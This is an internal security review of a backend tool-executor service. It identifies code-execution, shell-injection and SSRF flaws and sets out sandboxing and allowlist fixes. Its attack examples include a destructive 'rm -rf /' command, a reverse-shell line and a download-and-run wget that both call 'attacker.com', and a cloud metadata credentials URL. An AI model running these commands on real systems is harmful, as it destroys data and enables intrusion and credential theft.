# Tool Executor Security Review & Hardening

**Date:** 2025-11-15  
**Reviewer Assessment:** B+ to A- (Strong foundation with critical vulnerabilities)  
**Status:** HARDENING IN PROGRESS  

---

## 🔴 Critical Vulnerabilities (P0) - MUST FIX BEFORE PRODUCTION

### 1. Arbitrary Code Execution in Python Scripts
**Location:** [`app/services/tool_executor.py::_execute_python`](backend/app/services/tool_executor.py:91)

**Problem:**
- Executes arbitrary Python code via `python3 -c` with NO sandboxing
- Runs with same permissions as application server
- Malicious tool could execute `os.system('rm -rf /')` or establish reverse shell

**Attack Example:**
```python
# Malicious tool script
import os; os.system('rm -rf /')
# Or worse: reverse shell
import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));...
```

**Fix Status:** 🔄 IN PROGRESS  
**Solution:**
- Execute in isolated Docker container (minimal, non-privileged, no network)
- Alternative: Use Firejail, gVisor, or Kata Containers
- Set resource limits (CPU, memory, disk)

---

### 2. Shell Injection Vulnerability
**Location:** [`app/services/tool_executor.py::_execute_shell`](backend/app/services/tool_executor.py:135)

**Problem:**
- Uses blacklist-based sanitization (fundamentally flawed)
- Uses `asyncio.create_subprocess_shell` (equivalent to `shell=True`)
- Trivial to bypass with command substitution

**Attack Example:**
```bash
# Bypasses blacklist check
echo $(ls /)
wget http://attacker.com/malware -O /tmp/malware; chmod +x /tmp/malware; /tmp/malware
```

**Fix Status:** 🔄 IN PROGRESS  
**Solution:**
- NEVER use `shell=True` or `create_subprocess_shell`
- Use `create_subprocess_exec` with command as list: `["ls", "-la", "/tmp"]`
- Dynamic arguments must be separate list items
- Execute in sandbox like Python scripts

---

### 3. Server-Side Request Forgery (SSRF)
**Location:** [`app/services/tool_executor.py::_execute_api`](backend/app/services/tool_executor.py:174), [`_execute_http`](backend/app/services/tool_executor.py:249)

**Problem:**
- Can make requests to ANY URL including internal network
- Allows scanning internal network (127.0.0.1, 10.0.0.0/8, etc.)
- Can interact with cloud metadata APIs (169.254.169.254)

**Attack Example:**
```python
# Tool configured to scan internal network
url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Or access internal services
url = "http://localhost:5432/admin"
```

**Fix Status:** 🔄 IN PROGRESS  
**Solution:**
- Implement domain allowlist for trusted external APIs
- At minimum: Blocklist private/reserved IP ranges
- Validate URLs before making requests

---

## 🟡 High Priority Issues (P1)

### 4. Incomplete SQL Execution
**Location:** [`app/services/tool_executor.py::_execute_sql`](backend/app/services/tool_executor.py:271)

**Problem:**
- Currently returns mock data
- No actual database connection

**Fix Status:** ⏳ PLANNED  
**Solution:**
- Create dedicated read-only PostgreSQL role
- Grant SELECT only on approved schemas/tables
- Always use parameterized queries
- Connect using read-only credentials

---

### 5. Weak Input Validation
**Location:** [`app/services/tool_executor.py::_validate_input`](backend/app/services/tool_executor.py:80)

**Problem:**
- Only checks required field presence
- No type, format, or constraint validation

**Fix Status:** 🔄 IN PROGRESS  
**Solution:**
- Use Pydantic for robust validation
- Dynamically create models from JSON Schema
- Validate types, formats, ranges automatically

---

## ✅ Strengths (What Works Well)

1. **Excellent Architecture**
   - Centralized ToolExecutor class
   - Type-based routing with enum
   - Fully asynchronous design

2. **Security Awareness**
   - Timeouts on all I/O operations
   - Input validation structure
   - SQL injection prevention awareness
   - Shell command sanitization attempt

3. **Resilience**
   - Custom exception handling
   - Retry logic with exponential backoff
   - Proper error logging

---

## 🔧 Implementation Plan

### Phase 1: Critical Fixes (P0)
- [ ] Implement Docker-based sandbox for Python execution
- [ ] Refactor shell execution to use `create_subprocess_exec`
- [ ] Add SSRF protection (IP blocklist + domain allowlist)
- [ ] Add security warnings to prevent production deployment

### Phase 2: Hardening (P1-P2)
- [ ] Implement read-only SQL execution
- [ ] Replace input validation with Pydantic
- [ ] Add resource limits (CPU, memory, disk)
- [ ] Implement execution audit logging

### Phase 3: Advanced Security
- [ ] Add tool approval workflow
- [ ] Implement execution rate limiting
- [ ] Add tool capability matrix
- [ ] Security scanning for tool definitions

---

## 🚨 Production Deployment Blockers

**DO NOT DEPLOY TO PRODUCTION** until these are resolved:

1. ❌ Python execution sandbox (P0)
2. ❌ Shell execution hardening (P0)
3. ❌ SSRF protection (P0)

**Estimated Time to Production-Ready:** 5-7 days  
**Recommended Team:** Senior security engineer + backend developer

---

## 📚 Security Best Practices Applied

### Defense in Depth
- Multiple layers of security (validation, sandboxing, permissions)
- Fail-safe defaults (deny by default)
- Least privilege principle

### Secure by Design
- Centralized security logic
- Structured error handling
- Comprehensive audit logging

### Security Considerations
- No hardcoded secrets
- Proper timeout handling
- Resource limit awareness
- Input sanitization mindset

---

## 🔐 Recommended Security Controls

### Runtime Security
```yaml
sandbox:
  provider: docker  # or firejail, gvisor
  network: none
  filesystem: readonly
  memory: 512MB
  cpu: 0.5
  timeout: 300s
  
security:
  allowlist:
    domains:
      - api.example.com
      - api.trusted-service.com
  blocklist:
    ips:
      - 10.0.0.0/8      # Private
      - 172.16.0.0/12   # Private
      - 192.168.0.0/16  # Private
      - 127.0.0.0/8     # Loopback
      - 169.254.0.0/16  # Link-local
      - ::1/128         # IPv6 loopback
```

### Tool Approval Process
1. Security review of tool definition
2. Test execution in sandbox
3. Approval by security team
4. Monitoring for 48 hours
5. Full deployment

---

## 📊 Security Maturity Roadmap

### Current State: Development (Level 2/5)
- Basic security awareness
- Some controls in place
- Not production-ready

### Target State: Production (Level 4/5)
- Comprehensive sandboxing
- Multi-layered defense
- Full audit logging
- Incident response ready

### Path Forward:
1. **Week 1:** Address P0 vulnerabilities
2. **Week 2:** Implement P1 improvements
3. **Week 3:** Security testing & validation
4. **Week 4:** Production deployment

---

## 🎓 Lessons for Future Development

1. **Never Trust User Input** - Even "internal" tool definitions
2. **Sandbox Everything** - Assume all code is malicious
3. **Deny by Default** - Allowlists > Blocklists
4. **Defense in Depth** - Multiple security layers
5. **Security First** - Design security before functionality

---

## 📝 Security Checklist

### Before Production Deployment
- [ ] All P0 vulnerabilities resolved
- [ ] Security audit completed
- [ ] Penetration testing performed
- [ ] Incident response plan documented
- [ ] Security monitoring configured
- [ ] Disaster recovery tested
- [ ] Security training completed

### Ongoing Security
- [ ] Weekly vulnerability scanning
- [ ] Monthly security reviews
- [ ] Quarterly penetration testing
- [ ] Annual security audit
- [ ] Continuous monitoring
- [ ] Regular security updates

---

**Assessment:** Strong foundation, critical vulnerabilities identified and being addressed  
**Grade:** B+ → A (after hardening)  
**Status:** 🔄 Actively being hardened  
**Target Date:** 2025-11-22  

---

**Last Updated:** 2025-11-15  
**Next Review:** After P0 fixes completed  
**Security Contact:** Backend Team Lead